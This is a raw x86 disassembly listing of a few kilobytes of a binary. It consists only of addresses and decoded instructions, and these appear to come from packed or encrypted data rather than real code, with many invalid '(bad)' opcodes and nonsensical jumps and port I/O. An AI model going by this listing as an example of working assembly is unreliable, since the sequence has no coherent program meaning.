  421f1f:	ins    BYTE PTR es:[edi],dx
  421f20:	inc    ebp
  421f21:	push   0x1fa44455
  421f26:	inc    edx
  421f27:	jns    0x421f33
  421f29:	push   ds
  421f2a:	inc    ecx
  421f2b:	xchg   esp,eax
  421f2c:	sbb    ch,BYTE PTR [ebp+0x2ab59f90]
  421f32:	fist   WORD PTR ds:0x8922c62d
  421f38:	(bad)  
  421f39:	fwait
  421f3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f3b:	pop    DWORD PTR [ebp-0x6b]
  421f3e:	ds dec esp
  421f40:	pop    ss
  421f41:	xor    al,0xa5
  421f43:	inc    esi
  421f44:	sub    al,0x81
  421f46:	in     al,0x94
  421f48:	pop    DWORD PTR [edi-0x78b563b4]
  421f4e:	aas    
  421f4f:	aaa    
  421f50:	and    BYTE PTR [edi-0x73a62cce],ah
  421f56:	mov    edx,0xcb0eb97b
  421f5b:	dec    esi
  421f5c:	or     al,0xd9
  421f5e:	sub    BYTE PTR [edx],cl
  421f60:	push   ebp
  421f61:	adc    eax,0x6c0302a8
  421f66:	jg     0x421f5a
  421f68:	jp     0x421f38
  421f6a:	mov    eax,0x970479d7
  421f6f:	or     eax,0x4e6b9445
  421f74:	scas   al,BYTE PTR es:[edi]
  421f75:	cdq    
  421f76:	jmp    0x6566:0xc96111fe
  421f7d:	in     eax,0xdf
  421f7f:	add    al,0x42
  421f81:	call   0xa3af4c12
  421f86:	outs   dx,DWORD PTR ds:[esi]
  421f87:	cld    
  421f88:	mov    WORD PTR [edi-0x10e3c40c],ds
  421f8e:	or     DWORD PTR [edx],esi
  421f90:	repnz cmp dl,BYTE PTR [eax-0x7f5d8f0]
  421f97:	push   cs
  421f98:	sahf   
  421f99:	out    0x9a,eax
  421f9b:	inc    edi
  421f9c:	lds    ebx,FWORD PTR [ecx+esi*4+0x6f5c2b09]
  421fa3:	add    ebx,DWORD PTR [ecx-0xdb7073a]
  421fa9:	jno    0x421fdb
  421fab:	pop    ss
  421fac:	hlt    
  421fad:	icebp  
  421fae:	leave  
  421faf:	test   BYTE PTR [ecx-0x79e4c9d9],cl
  421fb5:	scas   al,BYTE PTR es:[di]
  421fb7:	bound  esi,QWORD PTR es:[eax-0x6c]
  421fbb:	in     eax,0x85
  421fbd:	bound  edx,QWORD PTR [edx]
  421fbf:	inc    ecx
  421fc0:	arpl   WORD PTR es:0x283aef3f,di
  421fc7:	sbb    edi,DWORD PTR [ebx]
  421fc9:	arpl   WORD PTR [ecx],dx
  421fcb:	sub    DWORD PTR [edx],ebp
  421fcd:	mov    cs,WORD PTR [eax+0x12851421]
  421fd3:	inc    esp
  421fd4:	fist   WORD PTR [eax+0x1b]
  421fd7:	push   ds
  421fd8:	jbe    0x422059
  421fda:	jbe    0x421fa6
  421fdc:	cmp    al,0x31
  421fde:	in     al,0x89
  421fe0:	fld    st(7)
  421fe2:	cdq    
  421fe3:	ret    0x40f1
  421fe6:	mov    cl,BYTE PTR [ebx-0x1d]
  421fe9:	push   cs
  421fea:	fbstp  TBYTE PTR [esi+0x4b]
  421fed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421fee:	inc    edx
  421fef:	in     al,0xd5
  421ff1:	mov    ecx,0x20743600
  421ff6:	mov    WORD PTR [edi],?
  421ff8:	xchg   ebp,eax
  421ff9:	fs mov ebp,0xdcbccd80
  421fff:	pop    ds
  422000:	(bad)  
  422001:	pop    esi
  422002:	push   ebp
  422003:	xchg   esp,eax
  422004:	mov    ebx,0x2f35181d
  422009:	aas    
  42200a:	dec    esp
  42200b:	xchg   edi,eax
  42200c:	ds jb  0x42200e
  42200f:	adc    ecx,eax
  422011:	gs cli 
  422013:	push   ss
  422014:	lock mov ebx,0xfdbfb27b
  42201a:	out    0x56,eax
  42201c:	sbb    bl,BYTE PTR [ebp-0x413fc1cf]
  422022:	fisubr WORD PTR [esi+0x26]
  422025:	rol    esp,cl
  422027:	gs dec edx
  422029:	div    BYTE PTR [esi-0x23931b17]
  42202f:	(bad)  
  422030:	jb     0x422048
  422032:	jp     0x421fdb
  422034:	arpl   sp,cx
  422036:	cli    
  422037:	shl    ecx,cl
  422039:	jl     0x422058
  42203b:	inc    eax
  42203c:	shl    DWORD PTR [edi],0x9b
  42203f:	or     edi,ebp
  422041:	mov    edi,0xf1922238
  422046:	pop    es
  422047:	push   eax
  422048:	inc    edx
  422049:	xchg   esp,eax
  42204a:	daa    
  42204b:	cld    
  42204c:	jb     0x422062
  42204e:	mov    ds:0xeea31847,al
  422053:	jge    0x422075
  422055:	add    al,0xc6
  422057:	(bad)  
  422058:	sahf   
  422059:	or     DWORD PTR [edx-0x6],edx
  42205c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42205d:	pusha  
  42205e:	pop    ecx
  42205f:	mov    eax,ds:0x11b57fed
  422064:	pop    es
  422065:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422066:	mov    al,ds:0x2bd7f82
  42206b:	hlt    
  42206c:	nop
  42206d:	fsub   DWORD PTR [ecx+edx*4]
  422070:	hlt    
  422071:	dec    ecx
  422072:	jmp    0x24db0fed
  422077:	dec    esp
  422078:	and    eax,0x23752e61
  42207d:	lahf   
  42207e:	cdq    
  42207f:	xor    BYTE PTR [ecx-0x49437e21],bh
  422085:	scas   al,BYTE PTR es:[edi]
  422086:	test   al,0x16
  422088:	lahf   
  422089:	push   ss
  42208a:	or     ah,BYTE PTR [eax-0x2cf7bfc6]
  422090:	jecxz  0x422065
  422092:	push   0x59ad1994
  422097:	fcmovnb st,st(1)
  422099:	xchg   ecx,eax
  42209a:	fs jns 0x42209b
  42209d:	retf   
  42209e:	repnz mov bh,0x56
  4220a1:	(bad)  
  4220a2:	out    0xbd,al
  4220a4:	in     al,dx
  4220a5:	div    BYTE PTR [eax]
  4220a7:	aas    
  4220a8:	fwait
  4220a9:	cmc    
  4220aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220ab:	cs es in eax,dx
  4220ae:	inc    esi
  4220af:	outs   dx,BYTE PTR ds:[esi]
  4220b0:	imul   ecx,DWORD PTR [esp+edi*8-0x1352b2b7],0x20
  4220b8:	adc    BYTE PTR [ebx-0x7b1fcc61],al
  4220be:	adc    eax,0x2889b0ea
  4220c3:	jp     0x42212d
  4220c5:	bound  edx,QWORD PTR fs:[ecx+0x3c]
  4220c9:	and    esi,DWORD PTR [edx+edi*2+0x2b]
  4220cd:	sub    al,BYTE PTR [ebx+0x453b002f]
  4220d3:	lahf   
  4220d4:	ror    BYTE PTR [edx+0x75],1
  4220d7:	iret   
  4220d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220d9:	mov    bl,0xe4
  4220db:	jne    0x422150
  4220dd:	pop    esi
  4220de:	mul    BYTE PTR [ebp-0x7259221b]
  4220e4:	cdq    
  4220e5:	xor    eax,0xb0c9d580
  4220ea:	div    esi
  4220ec:	xor    DWORD PTR ds:0xab69bda1,esp
  4220f2:	inc    edi
  4220f3:	push   ecx
  4220f4:	sbb    ebp,DWORD PTR [esp]
  4220f7:	xchg   BYTE PTR ds:[edx],bl
  4220fa:	ror    esp,cl
  4220fc:	xchg   ebp,eax
  4220fd:	jg     0x4220dc
  4220ff:	ds inc esi
  422101:	jns    0x4220d4
  422103:	mov    ecx,0x2ac11256
  422108:	push   ds
  422109:	addr16 loopne 0x42217e
  42210c:	js     0x422169
  42210e:	xchg   ebx,eax
  42210f:	imul   ebx,DWORD PTR [edi+0x58ae4e7c],0x6e
  422116:	repnz add al,0x7e
  422119:	dec    edx
  42211a:	adc    ecx,DWORD PTR [ecx+0x53]
  42211d:	pop    ds
  42211e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42211f:	xchg   dl,al
  422121:	fld    DWORD PTR [eax+0x40838aff]
  422127:	inc    esi
  422128:	retf   
  422129:	imul   esp,ebp,0xf530da6c
  42212f:	add    esp,DWORD PTR [edi+0x60e7b5ba]
  422135:	jge    0x422105
  422137:	dec    esi
  422138:	mov    bh,0x1d
  42213a:	dec    ebp
  42213b:	neg    DWORD PTR [esi-0x17162610]
  422141:	ficomp DWORD PTR [ecx]
  422143:	das    
  422144:	sti    
  422145:	adc    al,0xdc
  422147:	clc    
  422148:	mov    ds,WORD PTR [edx-0x6f]
  42214b:	jg     0x4220d7
  42214d:	cmp    eax,ecx
  42214f:	adc    edi,edx
  422151:	(bad)  
  422152:	stos   DWORD PTR es:[edi],eax
  422153:	xchg   ebp,eax
  422154:	lea    edx,[ecx]
  422156:	cmp    DWORD PTR [eax-0x4a],edi
  422159:	jnp    0x4220df
  42215b:	pop    ecx
  42215c:	mov    ds:0x854d2c64,al
  422161:	dec    ebx
  422162:	jnp    0x42214e
  422164:	mov    ebp,DWORD PTR [edx-0x22957f3e]
  42216a:	cmp    ecx,DWORD PTR [ecx-0x27]
  42216d:	xchg   ecx,eax
  42216e:	jae    0x42216b
  422170:	push   edx
  422171:	or     DWORD PTR [edx+0x26],0xd4245c07
  422178:	dec    edi
  422179:	add    ebp,0x9945e6ab
  42217f:	pop    ecx
  422180:	shr    BYTE PTR ds:0x15291758,1
  422186:	xor    al,0x9c
  422188:	aaa    
  422189:	push   esi
  42218a:	adc    eax,0xf64b000a
  42218f:	xchg   edi,eax
  422190:	jae    0x42211c
  422192:	repnz pop edx
  422194:	jo     0x4221a5
  422196:	daa    
  422197:	xor    al,0x8
  422199:	mov    esp,DWORD PTR [ecx+0x35]
  42219c:	seto   dl
  42219f:	mov    ch,0xde
  4221a1:	xchg   ebp,eax
  4221a2:	push   esp
  4221a3:	mov    ecx,0x525c8f22
  4221a8:	inc    edx
  4221a9:	push   eax
  4221aa:	mov    ebx,0xe20862b6
  4221af:	mov    dh,0x2a
  4221b1:	jg     0x422217
  4221b3:	inc    esp
  4221b4:	cmp    ebx,DWORD PTR [edi-0x6565fa6a]
  4221ba:	shl    BYTE PTR [eax],cl
  4221bc:	dec    edx
  4221bd:	call   0x8284d570
  4221c2:	or     edx,eax
  4221c4:	aas    
  4221c5:	pop    edx
  4221c6:	or     al,BYTE PTR ds:0x1f621630
  4221cc:	pop    ds
  4221cd:	ror    BYTE PTR [ecx],0x4b
  4221d0:	outs   dx,BYTE PTR ss:[esi]
  4221d2:	aaa    
  4221d3:	sub    BYTE PTR [esi+ebx*1-0x4e],al
  4221d7:	push   ebx
  4221d8:	mov    ebp,0x40d643b7
  4221dd:	cdq    
  4221de:	rcl    ch,1
  4221e0:	mov    edi,0xf678a89
  4221e5:	dec    esi
  4221e6:	inc    edx
  4221e7:	jecxz  0x42224b
  4221e9:	mov    dh,0xee
  4221eb:	add    eax,0xf84f3b1f
  4221f0:	out    dx,al
  4221f1:	pop    ebp
  4221f2:	sbb    BYTE PTR ds:0x371d0ab6,cl
  4221f8:	outs   dx,DWORD PTR ds:[esi]
  4221f9:	stos   BYTE PTR es:[edi],al
  4221fa:	sub    dh,bh
  4221fc:	scas   eax,DWORD PTR es:[edi]
  4221fd:	add    eax,0xa6184518
  422202:	sbb    dh,cl
  422204:	or     eax,0x97f11be3
  42220a:	mov    ecx,0x6e8acc98
  42220f:	jne    0x42227c
  422211:	and    DWORD PTR [ebp+0x68fe9a9d],0x19
  422218:	(bad)  
  422219:	mov    al,0x3
  42221b:	arpl   bx,ax
  42221d:	pop    edi
  42221e:	xchg   esp,eax
  42221f:	mov    bl,0x2d
  422221:	xor    dh,BYTE PTR [esi-0x2b]
  422224:	outs   dx,DWORD PTR ds:[esi]
  422225:	xor    esi,DWORD PTR [ebx-0x38]
  422228:	(bad)  
  422229:	out    dx,eax
  42222a:	dec    eax
  42222b:	fwait
  42222c:	inc    eax
  42222d:	imul   ebp,DWORD PTR [esi+0x2a],0x4b
  422231:	fadd   DWORD PTR ds:0xafffdae
  422237:	push   esp
  422238:	mov    ebp,0xddaeeff1
  42223d:	cmp    BYTE PTR [edx-0x7b],ah
  422240:	test   eax,0x4d5584db
  422245:	jge    0x422215
  422247:	push   ss
  422248:	retf   
  422249:	and    cl,BYTE PTR [edi]
  42224b:	stos   DWORD PTR es:[edi],eax
  42224c:	scas   al,BYTE PTR es:[edi]
  42224d:	loopne 0x422218
  42224f:	inc    ebx
  422250:	mov    ebx,0x1077273
  422255:	retf   0xc9db
  422258:	scas   eax,DWORD PTR es:[edi]
  422259:	aad    0xcf
  42225b:	je     0x42228b
  42225d:	mov    dl,0x6e
  42225f:	and    DWORD PTR [esi+esi*2+0x4f8e81b7],edx
  422266:	push   edx
  422267:	mov    ebp,ebp
  422269:	sub    DWORD PTR [edi-0x2b22c870],ebx
  42226f:	jns    0x4222a3
  422271:	mov    al,ds:0xc9405215
  422276:	mov    ah,0xc4
  422278:	mov    DWORD PTR [edx],edx
  42227a:	vsqrtss xmm6,xmm3,DWORD PTR [ebp-0x20648bec]
  422282:	icebp  
  422283:	or     ecx,DWORD PTR [eax]
  422285:	fisub  DWORD PTR [ecx-0x34]
  422288:	daa    
  422289:	popf   
  42228a:	sbb    dl,al
  42228c:	and    BYTE PTR [esi-0x605d9996],dh
  422292:	xchg   edx,eax
  422293:	loopne 0x4222b6
  422295:	scas   eax,DWORD PTR es:[edi]
  422296:	cmp    BYTE PTR [eax],cl
  422298:	test   DWORD PTR [ecx+edx*8-0x692bd800],ebx
  42229f:	iret   
  4222a0:	adc    BYTE PTR [ecx+0x29299743],ch
  4222a6:	pop    esi
  4222a7:	mov    dl,0x0
  4222a9:	add    BYTE PTR [edx+0x44],al
  4222ac:	inc    ebx
  4222ad:	push   edi
  4222ae:	inc    edi
  4222af:	push   edi
  4222b0:	push   esi
  4222b1:	push   ebp
  4222b2:	outs   dx,DWORD PTR ds:[esi]
  4222b3:	pop    ebp
  4222b4:	mov    ds:0x26259bdc,eax
  4222b9:	ret    0xb180
  4222bc:	add    DWORD PTR [eax],eax
  4222be:	xchg   BYTE PTR [esi],al
  4222c0:	add    BYTE PTR [eax],al
  4222c2:	mov    al,ds:0x590c9967
  4222c7:	sar    DWORD PTR [edx-0x3a],cl
  4222ca:	pop    ebp
  4222cb:	enter  0xd2a5,0xdc
  4222cf:	mov    ebx,0xca2ffaee
  4222d4:	push   0x31
  4222d6:	or     BYTE PTR [ebx+0x3e],dl
  4222d9:	rol    DWORD PTR [ecx+0x76f956f7],cl
  4222df:	retf   0xaa25
  4222e2:	clc    
  4222e3:	push   edi
  4222e4:	mov    dl,0xe7
  4222e6:	out    dx,eax
  4222e7:	xchg   esp,eax
  4222e8:	jb     0x422326
  4222ea:	and    eax,0xb97fe412
  4222ef:	xchg   ebp,eax
  4222f0:	(bad)  
  4222f1:	adc    eax,0xa4c5dae1
  4222f6:	add    eax,0x273b3cf
  4222fb:	jecxz  0x42231e
  4222fd:	sbb    eax,0xc89893b4
  422302:	mov    dh,0xb4
  422304:	pushf  
  422305:	in     al,dx
  422306:	iret   
  422307:	(bad)  
  422308:	mov    al,ds:0x9ef3c31b
  42230d:	fwait
  42230e:	and    esi,esi
  422310:	xchg   edx,eax
  422311:	cmp    al,0xb5
  422313:	jb     0x42236a
  422315:	or     edi,DWORD PTR [edx-0x2]
  422318:	pushf  
  422319:	pushf  
  42231a:	dec    ebx
  42231b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42231c:	aam    0xb5
  42231e:	mov    eax,ds:0x87441dbe
  422323:	(bad)  
  422324:	dec    esp
  422325:	lahf   
  422326:	cmp    BYTE PTR [ecx-0x46],ch
  422329:	and    al,0x79
  42232b:	mov    cl,0xcd
  42232d:	idiv   BYTE PTR [edi-0x4f3d37f4]
  422333:	mov    al,ds:0x4b3bce7c
  422338:	jp     0x4223ab
  42233a:	clc    
  42233b:	imul   eax,DWORD PTR [edi-0x22],0x10
  42233f:	mov    esi,0xc0a0cd7c
  422344:	fdiv   st,st(2)
  422346:	rol    DWORD PTR [eax],cl
  422348:	add    esi,DWORD PTR [ebp-0x35938503]
  42234e:	(bad)  
  42234f:	aam    0x10
  422351:	mov    al,ds:0xadbf47e0
  422356:	test   al,0x2f
  422358:	leave  
  422359:	mov    esi,0x3df35761
  42235e:	sbb    al,0x3f
  422360:	loop   0x4222f0
  422362:	(bad)  
  422363:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422364:	add    al,0x9e
  422366:	loopne 0x4223b3
  422368:	sub    ebp,esp
  42236a:	sbb    cl,al
  42236c:	addr16 cmp eax,0x8faf9f20
  422372:	ss fwait
  422374:	test   DWORD PTR [ebx-0x51],ebp
  422377:	mov    DWORD PTR [edi-0x7],eax
  42237a:	sbb    DWORD PTR [esi-0x2],edx
  42237d:	adc    BYTE PTR ds:0x132c4a76,dl
  422383:	pop    eax
  422384:	in     al,dx
  422385:	mov    esi,0xe3b48425
  42238a:	je     0x4223fb
  42238c:	leave  
  42238d:	mov    ecx,ebp
  42238f:	imul   eax,edi,0xa
  422392:	cmp    ecx,esp
  422394:	sbb    eax,edx
  422396:	xlat   BYTE PTR ds:[ebx]
  422397:	fsubr  QWORD PTR [eax+0x4ac413a5]
  42239d:	mov    eax,ds:0x103a9df7
  4223a2:	loopne 0x42233f
  4223a4:	xor    dh,cl
  4223a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4223a7:	mov    ah,0x1
  4223a9:	pop    ecx
  4223aa:	ins    BYTE PTR es:[edi],dx
  4223ab:	fldcw  WORD PTR [esi+0x2e178906]
  4223b1:	pop    es
  4223b2:	pop    ebp
  4223b3:	aas    
  4223b4:	sbb    eax,DWORD PTR [eax-0x49]
  4223b7:	aaa    
  4223b8:	push   es
  4223b9:	adc    eax,0xc9beea9b
  4223be:	push   0xffffff87
  4223c0:	ss xchg ebp,eax
  4223c2:	out    0xec,al
  4223c4:	pop    ebp
  4223c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223c6:	xchg   ebx,eax
  4223c7:	mul    edx
  4223c9:	mul    DWORD PTR [ecx+0x7]
  4223cc:	test   DWORD PTR [ecx],edi
  4223ce:	or     bh,BYTE PTR [ecx]
  4223d0:	ja     0x4223cb
  4223d2:	mov    ebp,0xfc73c784
  4223d7:	adc    eax,0x85210172
  4223dc:	and    bh,BYTE PTR [eax+0x50]
  4223df:	fidivr DWORD PTR [edi+0x49]
  4223e2:	outs   dx,BYTE PTR ds:[esi]
  4223e3:	and    DWORD PTR [edi-0x41],edi
  4223e6:	mov    eax,ds:0xe38242fb
  4223eb:	out    0x7a,al
  4223ed:	jo     0x42244b
  4223ef:	ds mov ebp,0x221ce31b
  4223f5:	call   0x7218:0x2ca649a8
  4223fc:	sbb    esi,DWORD PTR [edi+0x79]
  4223ff:	add    BYTE PTR [esi-0x7b181431],0x67
  422406:	in     eax,dx
  422407:	push   esi
  422408:	fwait
  422409:	cmp    ah,BYTE PTR [edx-0x55f97350]
  42240f:	jnp    0x422440
  422411:	pop    ecx
  422412:	add    ah,BYTE PTR [esi+0x4e9d7460]
  422418:	xor    eax,0x91d48646
  42241d:	retf   0x7c4d
  422420:	xchg   ecx,eax
  422421:	enter  0x67fb,0x5c
  422425:	xchg   ebp,eax
  422426:	push   0x3
  422428:	xlat   BYTE PTR ds:[ebx]
  422429:	or     ebx,DWORD PTR [edx+0xc171f4c]
  42242f:	dec    ebp
  422430:	mov    eax,ds:0xceee0804
  422435:	(bad)  
  422436:	stc    
  422437:	call   0x5b028f50
  42243c:	ror    BYTE PTR [edi+0xd0a29d1],1
  422442:	stos   BYTE PTR es:[edi],al
  422443:	(bad)  
  422444:	sub    bl,bl
  422446:	adc    DWORD PTR [ecx],eax
  422448:	cli    
  422449:	add    eax,0xd09a5621
  42244e:	out    0x7,eax
  422450:	push   es
  422451:	int    0xdb
  422453:	jbe    0x422417
  422455:	mov    eax,ds:0x930299e0
  42245a:	or     esp,DWORD PTR [ebp-0xa]
  42245d:	popa   
  42245e:	out    dx,al
  42245f:	dec    ecx
  422460:	out    dx,eax
  422461:	jge    0x42246c
  422463:	and    eax,0x40dc84f4
  422468:	out    0x72,al
  42246a:	call   0x214d:0xb710f64c
  422471:	or     DWORD PTR [esi-0x41],esp
  422474:	pop    eax
  422475:	and    eax,0x93ca46d4
  42247a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42247b:	fbld   TBYTE PTR [edx+ebp*8]
  42247e:	enter  0x8b07,0x4a
  422482:	and    ebx,DWORD PTR [edi]
  422484:	lock mov esi,0xa09d9351
  42248a:	lods   al,BYTE PTR ds:[esi]
  42248b:	xchg   ebp,eax
  42248c:	adc    al,0xb8
  42248e:	xchg   ecx,eax
  42248f:	cli    
  422490:	rcl    ah,1
  422492:	icebp  
  422493:	mov    bh,0xf0
  422495:	dec    eax
  422496:	mov    ebp,0xbe94a9c2
  42249b:	adc    esi,DWORD PTR [edx]
  42249d:	jmp    0xfa8:0x8863610f
  4224a4:	adc    eax,0x34cb1745
  4224a9:	inc    edx
  4224aa:	mov    esi,0x56e12d4e
  4224af:	loopne 0x4224b8
  4224b1:	sub    DWORD PTR [eax+0x48],esp
  4224b4:	jmp    0x422484
  4224b6:	test   al,0xcf
  4224b8:	cmc    
  4224b9:	sti    
  4224ba:	dec    edi
  4224bb:	pop    ds
  4224bc:	mov    edi,0xc99f1b7a
  4224c1:	(bad)  
  4224c2:	fsubr  st(1),st
  4224c4:	mov    dh,0xdd
  4224c6:	add    eax,0x89ec4b2e
  4224cb:	sbb    DWORD PTR [ebp-0x51],esp
  4224ce:	inc    eax
  4224cf:	dec    edx
  4224d0:	std    
  4224d1:	mov    edi,0x4e445115
  4224d6:	push   ss
  4224d7:	mov    ds:0x9079b2a2,al
  4224dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224dd:	frstor [edx]
  4224df:	test   DWORD PTR [eax-0x4318f4b9],ebx
  4224e5:	rol    BYTE PTR [esi+0x5b9b2cf1],1
  4224eb:	xor    BYTE PTR ds:0x6eb5289b,0xf6
  4224f2:	and    ch,BYTE PTR [esp+edi*8]
  4224f5:	or     DWORD PTR [ebx],edi
  4224f7:	stos   BYTE PTR es:[edi],al
  4224f8:	cdq    
  4224f9:	scas   al,BYTE PTR es:[edi]
  4224fa:	lods   al,BYTE PTR ds:[esi]
  4224fb:	ins    BYTE PTR es:[edi],dx
  4224fc:	mov    ds:0x277732c2,al
  422501:	ja     0x4224da
  422503:	fdiv   QWORD PTR [esi+0x62]
  422506:	mov    esp,ebx
  422508:	and    al,0xa3
  42250a:	gs test eax,0xa1280bef
  422510:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422511:	out    dx,al
  422512:	push   cs
  422513:	push   es
  422514:	leave  
  422515:	sub    BYTE PTR [edx-0xf],ch
  422518:	jle    0x42254b
  42251a:	xor    ecx,ebp
  42251c:	mov    DWORD PTR [esi-0x692e61e1],esp
  422522:	cmp    edx,0x157bb67c
  422528:	sti    
  422529:	test   al,0x15
  42252b:	mov    eax,0xcc765bf
  422530:	xchg   ebx,eax
  422531:	cmp    BYTE PTR [ebx-0x74ef6d5f],ch
  422537:	xchg   esp,eax
  422538:	popa   
  422539:	dec    edx
  42253a:	mov    ah,0x61
  42253c:	aas    
  42253d:	fbld   TBYTE PTR [ebx]
  42253f:	push   ecx
  422540:	cmc    
  422541:	nop
  422542:	(bad)  
  422544:	nop
  422545:	dec    ebp
  422546:	push   eax
  422547:	xor    BYTE PTR [ebx+0x72],0xb0
  42254b:	pop    ds
  42254c:	in     eax,0xec
  42254e:	loop   0x422505
  422550:	pop    edx
  422551:	daa    
  422552:	sbb    eax,0xfdd6e5eb
  422557:	or     dh,BYTE PTR [eax+0x1f738111]
  42255d:	out    dx,eax
  42255e:	outs   dx,BYTE PTR ds:[esi]
  42255f:	xchg   edi,eax
  422560:	out    dx,eax
  422561:	dec    edx
  422562:	pop    ss
  422563:	jge    0x422586
  422565:	shl    dh,1
  422567:	call   DWORD PTR [ecx-0x24]
  42256a:	popf   
  42256b:	add    ah,bl
  42256d:	lock mov ds:0x335871c8,eax
  422573:	inc    ebp
  422574:	and    eax,0x7d9ea067
  422579:	sub    BYTE PTR [ecx],0xa
  42257c:	sub    DWORD PTR [ecx],0xd8e113d7
  422582:	jb     0x4225b0
  422584:	inc    esp
  422585:	mov    ecx,0xdf7a481
  42258a:	repz and DWORD PTR [edx+0x51],esi
  42258e:	sbb    DWORD PTR [edx+0x32],ecx
  422591:	aam    0x97
  422593:	stos   BYTE PTR es:[edi],al
  422594:	pusha  
  422595:	fxch   st(5)
  422597:	push   esi
  422598:	fst    st(2)
  42259a:	scas   al,BYTE PTR es:[edi]
  42259b:	ins    BYTE PTR es:[edi],dx
  42259c:	push   esp
  42259d:	fimul  DWORD PTR [esi]
  42259f:	jecxz  0x42253a
  4225a1:	push   es
  4225a2:	fnstsw WORD PTR [eax+0x60]
  4225a5:	sub    eax,0x9046a1db
  4225aa:	or     edi,ebp
  4225ac:	jb     0x4225b7
  4225ae:	pop    ss
  4225af:	cmp    eax,0x9c63c2fb
  4225b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225b5:	scas   eax,DWORD PTR es:[edi]
  4225b6:	ror    al,0xa
  4225b9:	jmp    0x81affdf0
  4225be:	outs   dx,BYTE PTR ds:[esi]
  4225bf:	jmp    0x8e1d7a33
  4225c4:	popf   
  4225c5:	fadd   DWORD PTR [ecx-0x745275cc]
  4225cb:	mov    edx,0x5f20480e
  4225d0:	mov    ch,0x18
  4225d2:	push   0x44
  4225d4:	aas    
  4225d5:	outs   dx,BYTE PTR ds:[esi]
  4225d6:	fwait
  4225d7:	bound  edi,QWORD PTR [esi*2-0x5be0dce3]
  4225de:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225e1:	mov    eax,ds:0x2d68679b
  4225e6:	ret    0x80d0
  4225e9:	dec    edx
  4225ea:	push   ebx
  4225eb:	mov    ss,WORD PTR [esi]
  4225ed:	clc    
  4225ee:	fstp   TBYTE PTR [ecx+esi*1+0x2287ea8e]
  4225f5:	adc    ch,BYTE PTR ds:0xc7081e1b
  4225fb:	stc    
  4225fc:	push   edx
  4225fd:	mov    eax,DWORD PTR [edi]
  4225ff:	push   esi
  422600:	jb     0x4225d5
  422602:	dec    edi
  422603:	xchg   esp,eax
  422604:	jmp    0x1f7b:0x3ec59f21
  42260b:	or     bh,dl
  42260d:	rcl    bh,1
  42260f:	into   
  422610:	push   edi
  422611:	jp     0x422612
  422613:	rol    DWORD PTR [edx+0x2ca6eb20],1
  422619:	popf   
  42261a:	sbb    cl,BYTE PTR [ebx-0x1a]
  42261d:	mov    ecx,0x7af3175d
  422622:	fs sub al,ah
  422625:	mov    ch,0x1f
  422627:	dec    ebp
  422628:	loop   0x4225f0
  42262a:	mov    DWORD PTR [ebx+0x42193f00],esi
  422630:	mov    dl,0x4d
  422632:	cmp    eax,0x305b9ad2
  422637:	iret   
  422638:	inc    eax
  422639:	lea    ebx,[edx-0x1cb6417]
  42263f:	pop    ecx
  422640:	mov    al,ds:0xea613b20
  422645:	jb     0x422693
  422647:	dec    DWORD PTR [edx+0x6f]
  42264a:	sbb    edi,DWORD PTR [eax+0x6224246a]
  422650:	xchg   ebx,eax
  422651:	sub    al,0x5b
  422653:	stos   DWORD PTR es:[edi],eax
  422654:	push   esp
  422655:	mov    ds:0x6b1e17fa,al
  42265a:	test   eax,0x33e457bb
  42265f:	cwde   
  422660:	call   0xd304:0x84e03741
  422667:	dec    ebp
  422668:	mov    ah,0x47
  42266a:	out    0xa1,eax
  42266c:	(bad)  
  42266d:	(bad)
  422670:	lods   eax,DWORD PTR ds:[esi]
  422671:	ret    0x57d9
  422674:	(bad)  
  422675:	lahf   
  422676:	popf   
  422677:	pop    ebx
  422678:	jl     0x42269f
  42267a:	ja     0x422672
  42267c:	fcomip st,st(6)
  42267e:	push   0xe3821483
  422683:	jmp    0xd63557c9
  422688:	push   esi
  422689:	or     bl,ch
  42268b:	aad    0x15
  42268d:	push   ds
  42268e:	adc    DWORD PTR [ecx],ebp
  422690:	inc    eax
  422691:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422692:	xor    eax,0xad491e75
  422697:	xchg   esp,eax
  422698:	and    BYTE PTR [ebx-0x5df4dc36],bl
  42269e:	leave  
  42269f:	je     0x422677
  4226a1:	fisub  WORD PTR [ebp+eiz*1-0x293930d4]
  4226a8:	mov    esi,0x64645b
  4226ad:	push   cs
  4226ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226af:	or     al,0xf5
  4226b1:	jo     0x422665
  4226b3:	mov    cl,0x2b
  4226b5:	clc    
  4226b6:	icebp  
  4226b7:	sub    DWORD PTR [edi],edx
  4226b9:	out    dx,eax
  4226ba:	neg    DWORD PTR [edi+0x24]
  4226bd:	sbb    DWORD PTR [edx+0x55],0x11
  4226c1:	popf   
  4226c2:	les    edi,FWORD PTR [edx+0x36cf9252]
  4226c8:	cdq    
  4226c9:	ins    DWORD PTR es:[edi],dx
  4226ca:	sahf   
  4226cb:	addr16 test cl,al
  4226ce:	ficomp WORD PTR [edi]
  4226d0:	enter  0x87aa,0xf
  4226d4:	push   0xfffffff1
  4226d6:	stc    
  4226d7:	icebp  
  4226d8:	inc    esi
  4226d9:	push   esi
  4226da:	pop    es
  4226db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4226dc:	push   cs
  4226dd:	gs push ebx
  4226df:	retf   0xd8ed
  4226e2:	and    bl,BYTE PTR [ebx-0x222702ed]
  4226e8:	or     eax,0xe911d15
  4226ed:	sbb    ax,0x5b31
  4226f1:	pop    ds
  4226f2:	bound  ebx,QWORD PTR [eax+eax*1+0x45]
  4226f6:	popa   
